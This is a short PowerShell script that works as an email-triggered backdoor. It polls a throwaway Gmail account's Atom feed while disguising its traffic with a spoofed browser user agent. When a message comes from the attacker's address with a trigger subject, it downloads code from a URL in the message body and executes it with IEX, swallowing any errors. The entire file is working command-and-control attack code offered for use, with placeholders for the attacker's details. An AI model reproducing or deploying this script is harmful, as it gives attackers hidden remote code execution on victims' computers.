###########################
# Variables configurable
###########################
$EmailAddr = "GMAILADDR@gmail.com";  # A burnable gmail account
$EmailPass = "GMAILPASS";            # Burnable gmail account password
$AttackerEmail = "ATTACKEREMAIL";    # The from address in the trigger email
$TriggerWord = "TRIGGERSUBJECT";     # The Subject trigger word
$Sleep=60;                           # Sleep timer to check the email every n second
###########################

$WebClient=new-object System.Net.WebClient;
$WebClient.Headers['User-Agent'] = 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)';
$WebClient.Credentials=new-object System.Net.NetworkCredential($EmailAddr, $EmailPass);

while ($True){
    $($([xml]$Webclient.DownloadString("https://mail.google.com/mail/feed/atom")).feed.entry | Select-Object @{Expression={$_.title};Label="Title"},@{Expression={$_.author.email};Label="Email"},@{Expression={$_.summary};Label="Body"}) | foreach {
    if($_.Email -match $AttackerEmail -and $_.Title -match $TriggerWord){
        Try{
            Start-Job -ScriptBlock {$CallbackClient = New-Object Net.WebClient
            $CallbackClient.Headers['User-Agent'] = 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)';
            IEX $CallbackClient.DownloadString($args[0])} -ArgumentList $_.Body            
        }
        Catch{
        }
    }
}
Start-Sleep -s $SLEEP}
